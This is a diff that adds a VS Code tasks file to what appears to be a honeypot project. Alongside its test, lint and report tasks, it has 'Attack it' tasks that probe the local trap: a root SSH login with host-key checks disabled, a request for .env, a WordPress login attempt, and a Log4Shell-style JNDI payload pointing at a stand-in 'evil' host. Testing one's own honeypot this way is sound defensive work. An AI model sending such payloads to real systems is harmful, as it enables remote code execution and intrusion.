@@ -1,0 +1,27 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {"label": "Install dev deps", "type": "shell", "command": "pip install -e '.[dev]'"},
+    {"label": "Test", "type": "shell", "command": "pytest -q", "group": {"kind": "test", "isDefault": true}},
+    {"label": "Lint", "type": "shell", "command": "ruff check ."},
+    {
+      "label": "Attack it: SSH",
+      "type": "shell",
+      "command": "ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1"
+    },
+    {
+      "label": "Attack it: web probes",
+      "type": "shell",
+      "command": "curl -s localhost:8080/.env; curl -s -H 'X-Api: ${jndi:ldap://evil/a}' localhost:8080/; curl -s -d 'log=admin&pwd=hunter2' localhost:8080/wp-login.php"
+    },
+    {
+      "label": "Live event feed",
+      "type": "shell",
+      "command": "tail -n 50 -F data/events.jsonl | python scripts/tail.py",
+      "isBackground": true,
+      "problemMatcher": []
+    },
+    {"label": "Report", "type": "shell", "command": "python -m sentinel.report data/events.jsonl"},
+    {"label": "Verify log chain", "type": "shell", "command": "python -m sentinel.report --verify data/events.jsonl"}
+  ]
+}
